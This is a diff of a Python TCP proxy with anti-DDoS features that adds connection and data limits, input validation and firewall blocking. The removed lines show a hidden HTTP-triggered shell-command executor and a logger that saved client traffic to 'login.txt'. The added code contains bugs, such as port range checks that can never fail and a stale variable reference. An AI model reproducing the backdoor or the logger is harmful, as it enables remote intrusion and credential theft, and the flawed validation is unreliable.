@@ -30,28 +30,23 @@ if (__name__ == "__main__"):
             sys.exit()
         def clear():
             system("cls")
-        def forward(ip,port,source,destination,is_a):
+        def forward(ip,port,source,destination,is_a,is_user_send):
+            len_data = -1
             try:
-                if (is_a==1):
-                    with open("login.txt","wb") as f:
-                        string = " "
-                        while string:
-                            string = source.recv(1024)
-                            if string:
-                                destination.sendall(string)
-                                f.write(string)
-                            else:
-                                source.shutdown(socket.SHUT_RD)
-                                destination.shutdown(socket.SHUT_WR)
-                else:
-                    string = " "
-                    while string:
+                string = " "
+                while string:
+                    if len_data<max_data_user:
                         string = source.recv(1024)
                         if string:
+                            if max_data_user>0 or is_user_send==0:
+                                len_data+=len(string)
                             destination.sendall(string)
                         else:
                             source.shutdown(socket.SHUT_RD)
                             destination.shutdown(socket.SHUT_WR)
+                    else:
+                        print("Out of size data: Port {} from {} ({} byte)".format(port,ip,max_data_user))
+                        break
             except TimeoutError:
                 print(">> Timeout: Port {} from {}".format(str(port),str(ip)))
             except ConnectionAbortedError:
@@ -62,11 +57,23 @@ if (__name__ == "__main__"):
                 print(">> Connection refused: Port {} from {}".format(str(port),str(ip)))
             except:
                 pass
+            if is_a==1:
+                global count_conn
+                count_conn-=1
             try:
                 source.shutdown(socket.SHUT_RD)
                 destination.shutdown(socket.SHUT_WR)
             except:
                 return
+
+        def close_conn():
+            for i in all_conn:
+                try:
+                    globals()[i].close()
+                except:
+                    pass
+            return
+
         def block_ip(con_ip,port,a):
             global ddos, force_block, list_ban_ip
             a.close()
@@ -76,27 +83,6 @@ if (__name__ == "__main__"):
             with open("block_ip.txt","a") as f:
                 f.write(",{},\n".format(con_ip))
             force_block[con_ip]=0
-        def exec_sys(conn,request,re):
-            import subprocess
-            payload=unquote(str(request.split()[1].decode('ascii').replace(re.decode('utf-8'),"")).replace("~//","\\")).replace("~/","/")
-            if payload == "":
-                conn.close()
-                return
-            try:
-                payload=str(subprocess.check_output(payload+" 2>NUL", shell=True, timeout=999999).decode().replace("\r","")).replace("\n","<br></br>")
-            except subprocess.CalledProcessError as e:
-                payload=str(e)
-            except:
-                conn.close()
-                return
-            content_length=len(payload)+3
-            conn.sendall(b"HTTP/1.0 200 OK\r\nContent-Type: text/html\r\n")
-            if content_length is not None:
-                conn.sendall(b"Content-Length: " + str(content_length).encode('ascii') + b"\r\n")
-            conn.sendall(b"\r\n")
-            conn.sendall(str(payload).encode())
-            conn.close()
-            return
         def create_rule(port):
             global list_ban_ip
             if (Popen("netsh advfirewall firewall show rule name=\"Khanh {0}\"".format(str(port)), shell=True, stdout=PIPE).stdout.read().decode().split("\r\n")[1][:2]=="No"):
@@ -113,8 +99,11 @@ if (__name__ == "__main__"):
             if (len(list_ban_ip)<8111):
                 _=Popen("netsh advfirewall firewall set rule name=\"Khanh {0}\" new remoteip=\"{1}\"".format(str(port),str(list_ban_ip)),shell=True,stdin=PIPE,stdout=DEVNULL)
         def open_port(port):
-            global ddos, block, force_block, list_ban_ip
+            global ddos, block, force_block, list_ban_ip, max_conn, count_conn, all_conn
+            current_conn=[]
+            all_conn=[]
             count=0
+            count_conn=0
             soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             try:
                 soc.bind((str(host_fake), int(port)))
@@ -124,41 +113,51 @@ if (__name__ == "__main__"):
                 while 1:
                     try:
                         a,b = soc.accept()
-                        con_ip = str(b[0])
-                        if (con_ip in block):
+                        if (b[0] in block):
                             a.close()
                             if (force_firewall_count>0):
                                 try:
-                                    force_block[con_ip]+=1
+                                    force_block[b[0]]+=1
                                 except:
-                                    force_block[con_ip]=1
-                                if (force_block[con_ip]>force_firewall_count):
-                                    print("!! Detected {0} try request {1} times! Blocking...".format(str(con_ip),str(force_block[con_ip])))
-                                    Thread(target=block_ip, args=(con_ip,port,a)).start()
-                                    force_block[con_ip]=0
+                                    force_block[b[0]]=1
+                                if (force_block[b[0]]>force_firewall_count):
+                                    print("!! Detected {0} try request {1} times! Blocking...".format(str(b[0]),str(force_block[con_ip])))
+                                    Thread(target=block_ip, args=(b[0],port,a)).start()
+                                    force_block[b[0]]=0
                                     continue
-                                print("Blocked connection from {0} ({1})".format(con_ip,force_block[con_ip]))
+                                print("Blocked connection from {0} ({1})".format(b[0],force_block[b[0]]))
                             else:
-                                print("Blocked connection from {0}".format(con_ip))
+                                print("Blocked connection from {0}".format(b[0]))
                         else:
-                            count+=1
-                            try:
-                                ddos[con_ip]+=1
-                            except KeyError:
-                                ddos[con_ip]=1
-                            print(f"{count}. Port {port} -> {port_real} | Accept: {con_ip} ({ddos[con_ip]})")
-                            try:
-                                if (ddos[con_ip]>block_on_count):
-                                    print("!! Detected DDOS from {}! Blocking...".format(con_ip))
-                                    block.append(con_ip)
-                                    Thread(target=block_ip, args=(con_ip,port,a)).start()
-                                    continue
-                            except:
-                                ddos[con_ip]=1
-                            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                            server_socket.connect((str(host_real), int(port_real)))
-                            Thread(target=forward, args=(con_ip,port,a,server_socket,1)).start()
-                            Thread(target=forward, args=(con_ip,port,server_socket,a,0)).start()
+                            if (count_conn<=max_conn) or (b[0] in current_conn):
+                                try:
+                                    ddos[b[0]]+=1
+                                except KeyError:
+                                    ddos[b[0]]=1
+                                try:
+                                    if (ddos[b[0]]>block_on_count):
+                                        print("!! Detected DDOS from {}! Blocking...".format(b[0]))
+                                        block.append(b[0])
+                                        Thread(target=block_ip, args=(b[0],port,a)).start()
+                                        continue
+                                except:
+                                    ddos[b[0]]=1
+                                current_conn.append(b[0])
+                                all_conn.append("conn_"+str(b[0])+str(b[1]))
+                                globals()["conn_"+str(b[0])+str(b[1])]=a
+                                count_conn+=1
+                                count+=1
+                                print(f"{count}. Port {port} -> {port_real} | Accept: {b[0]} ({ddos[b[0]]})")
+                                server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                                server_socket.settimeout(5)
+                                server_socket.connect((str(host_real), int(port_real)))
+                                server_socket.settimeout(180)
+                                a.settimeout(180)
+                                Thread(target=forward, args=(b[0],port,a,server_socket,1,1)).start()
+                                Thread(target=forward, args=(b[0],port,server_socket,a,0,0)).start()
+                            else:
+                                print("Full connection {}".format(b[0]))
+                                a.close()
                         sleep(float(time_connect))
                     except OSError as e:
                         print(f"ERROR: Port {port} | {e}")
@@ -242,13 +241,37 @@ if (__name__ == "__main__"):
         if (name=='nt'):
             try:
                 if (int(len([str(x) for x in host_fake.split(".") if x and x!="\n"])+len([str(x) for x in host_real.split(".") if x and x!="\n"])) != 8):
+                    print("ip fake or real may be not correct!")
                     _=int("KhanhNguyen9872")
-                _=int(port_real)
-                _=int(port_fake)
-                _=float(time_connect)
-                _=int(block_on_count)
-                _=int(reset_on_time)
-                _=int(is_get_sock)
+                if int(max_conn)<1:
+                    print("max conn should not be less than 1")
+                    _=int("KhanhNguyen9872")
+                if int(max_data_user)<0:
+                    print("max data should not be less than 0")
+                    _=int("KhanhNguyen9872")
+                if int(port_real)<1 and int(port_real)>65535:
+                    print("Port real must in range 1-65535")
+                    _=int("KhanhNguyen9872")
+                if int(port_fake)<1 and int(port_fake)>65535:
+                    print("Port fake must in range 1-65535")
+                    _=int("KhanhNguyen9872")
+                if int(port_fake)==int(port_real):
+                    print("Port fake and real must not the same!")
+                    _=int("KhanhNguyen9872")
+                if float(time_connect)<0:
+                    print("time connect should not be less than 0")
+                    _=int("KhanhNguyen9872")
+                if int(block_on_count)<1:
+                    print("Block on count should not be less than 1")
+                    _=int("KhanhNguyen9872")
+                if int(reset_on_time)<1:
+                    print("Reset on time should not be less than 1")
+                    _=int("KhanhNguyen9872")
+                if int(is_get_sock)==1 or int(is_get_sock)==0:
+                    pass
+                else:
+                    print("is get sock must be 0 or 1")
+                    _=int("KhanhNguyen9872")
                 _=ban_sock
                 _=headers
             except:
@@ -314,6 +337,9 @@ if (__name__ == "__main__"):
                     block.append(str(_))
                 del blockk
             block=list(set(block))
+            clear()
+            print("Warning: This tool only Anti-DDOS TCP Port, please block all UDP Port, because your server may be UDPFlood!\n")
+            input("Press Enter to continue! ")
             try:
                 while 1:
                     clear()
@@ -329,6 +355,8 @@ if (__name__ == "__main__"):
                         kill_process()
                     continue
             except KeyboardInterrupt:
+                print("Stopping all connection....")
+                close_conn()
                 print(">> Press Enter to Exit!")
                 input()
                 kill_process()
